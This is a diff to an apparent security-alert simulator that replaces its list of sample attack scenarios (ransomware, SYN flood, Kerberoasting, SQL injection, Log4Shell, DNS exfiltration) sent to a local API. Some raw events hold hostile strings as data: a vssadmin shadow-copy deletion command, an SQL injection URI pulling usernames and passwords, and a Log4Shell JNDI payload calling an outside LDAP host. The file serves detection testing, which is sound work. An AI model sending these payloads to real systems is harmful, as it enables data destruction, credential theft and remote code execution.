@@ -19,36 +19,59 @@ API_BASE = "http://localhost:8000"
 
 ATTACK_SCENARIOS = [
     {
-        "name": "[ATTACK] SSH Brute Force Attack",
-        "description": "Rapid repeated SSH login failures targeting edge bastion host",
-        "src_ip": "203.0.113.88",
-        "src_port": 54120,
-        "dst_ip": "192.168.1.20",
-        "dst_port": 22,
-        "protocol": "TCP",
-        "signature": "ET POLICY SSH Brute Force Attempt (Failed Logins >= 25)",
-        "category": "brute_force",
+        "name": "[1. MALWARE] LockBit 3.0 Ransomware Shadow Copy Wiping",
+        "description": "Mass file encryption & vssadmin shadow copy deletion command",
+        "src_ip": "198.51.100.22",
+        "src_port": 54100,
+        "dst_ip": "10.240.20.88",
+        "dst_port": 445,
+        "protocol": "SMB",
+        "signature": "Win32.Ransomware.LockBit3.0 Volume Shadow Deletion via vssadmin",
+        "category": "malware",
         "severity": "CRITICAL",
-        "risk_score": 95,
-        "raw_event": {
-            "service": "ssh",
-            "failed_attempts": 28,
-            "target_user": "root",
-            "tool": "hydra/v9.5"
-        }
+        "risk_score": 99,
+        "raw_event": {"command": "vssadmin.exe delete shadows /all /quiet", "target": "DC01"}
     },
     {
-        "name": "[ATTACK] Web Application SQL Injection Attack",
+        "name": "[2. NETWORK] Mirai Distributed TCP SYN Flood DDoS",
+        "description": "Volumetric SYN flood packet burst inundating edge gateway",
+        "src_ip": "194.26.29.112",
+        "src_port": 38910,
+        "dst_ip": "10.240.0.1",
+        "dst_port": 80,
+        "protocol": "TCP",
+        "signature": "Mirai IoT SYN Flood Distributed Denial of Service (> 1.2M pps)",
+        "category": "network",
+        "severity": "CRITICAL",
+        "risk_score": 94,
+        "raw_event": {"pps": 1200000, "flag": "SYN"}
+    },
+    {
+        "name": "[3. CREDENTIAL] Active Directory Kerberoasting Ticket Theft",
+        "description": "RC4-HMAC downgraded TGS ticket request for offline hash cracking",
+        "src_ip": "10.240.15.44",
+        "src_port": 51102,
+        "dst_ip": "10.240.10.4",
+        "dst_port": 88,
+        "protocol": "Kerberos",
+        "signature": "Kerberoasting Active Directory Ticket Request (RC4-HMAC downgrade)",
+        "category": "credential",
+        "severity": "HIGH",
+        "risk_score": 94,
+        "raw_event": {"spn": "MSSQLSvc/db-vault.prod:1433", "encryption": "rc4-hmac"}
+    },
+    {
+        "name": "[4. WEB/API] SQL Injection Union Select Database Extraction",
         "description": "Malicious payload injection attempting database extraction via HTTP GET",
         "src_ip": "198.51.100.99",
         "src_port": 49182,
-        "dst_ip": "192.168.1.10",
+        "dst_ip": "10.240.10.12",
         "dst_port": 443,
-        "protocol": "TCP",
+        "protocol": "HTTPS",
         "signature": "ET WEB_SPECIFIC_APPS SQL Injection in URI parameter 'id=1 UNION SELECT * FROM users'",
-        "category": "web_attack",
-        "severity": "HIGH",
-        "risk_score": 88,
+        "category": "web_api",
+        "severity": "CRITICAL",
+        "risk_score": 98,
         "raw_event": {
             "uri": "/api/v1/customers?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
             "method": "GET",
@@ -56,41 +79,32 @@ ATTACK_SCENARIOS = [
         }
     },
     {
-        "name": "[ATTACK] Distributed SYN Port Scan / Reconnaissance",
-        "description": "Port scanner mapping active network services across DMZ subnet",
-        "src_ip": "192.0.2.77",
-        "src_port": 39821,
-        "dst_ip": "192.168.1.10",
-        "dst_port": 8080,
-        "protocol": "TCP",
-        "signature": "ET SCAN Nmap Scripting Engine Vulnerability Sweep",
-        "category": "reconnaissance",
-        "severity": "HIGH",
-        "risk_score": 82,
-        "raw_event": {
-            "scan_type": "SYN_STEALTH",
-            "ports_scanned": [21, 22, 23, 25, 80, 443, 3306, 8080],
-            "packets_per_sec": 1200
-        }
-    },
-    {
-        "name": "[ATTACK] Cobalt Strike Command & Control (C2) Beacon",
-        "description": "Compromised internal host communicating with external threat actor server",
-        "src_ip": "192.168.1.150",
-        "src_port": 50431,
-        "dst_ip": "45.33.32.156",
+        "name": "[5. EXPLOITATION] Apache Log4Shell JNDI Remote Code Execution",
+        "description": "Zero-day JNDI lookup remote Java bytecode execution",
+        "src_ip": "185.220.101.5",
+        "src_port": 49152,
+        "dst_ip": "10.240.10.12",
         "dst_port": 443,
         "protocol": "HTTPS",
-        "signature": "ET TROJAN Cobalt Strike Malleable C2 HTTP Beaconing Activity",
-        "category": "c2",
+        "signature": "ET EXPLOIT Apache Log4j JNDI RCE (CVE-2021-44228)",
+        "category": "exploitation",
         "severity": "CRITICAL",
         "risk_score": 98,
-        "raw_event": {
-            "c2_domain": "update-service-cdn-telemetry.org",
-            "beacon_interval": 30,
-            "jitter": 15,
-            "packet_entropy": 7.92
-        }
+        "raw_event": {"jndi_payload": "${jndi:ldap://185.220.101.5:1389/Exploit}", "cve": "CVE-2021-44228"}
+    },
+    {
+        "name": "[6. POST-COMPROMISE] DNS Tunneling Data Exfiltration",
+        "description": "Base64 chunked database dump exfiltration over DNS TXT queries",
+        "src_ip": "10.240.20.88",
+        "src_port": 53000,
+        "dst_ip": "45.33.32.10",
+        "dst_port": 53,
+        "protocol": "DNS",
+        "signature": "ET POST_COMPROMISE Data Exfiltration Over DNS Tunnel (Base64 Chunked)",
+        "category": "post_compromise",
+        "severity": "CRITICAL",
+        "risk_score": 97,
+        "raw_event": {"bytes_exfiltrated": 15400000, "domain": "exfil.attacker-dns.org"}
     }
 ]
 
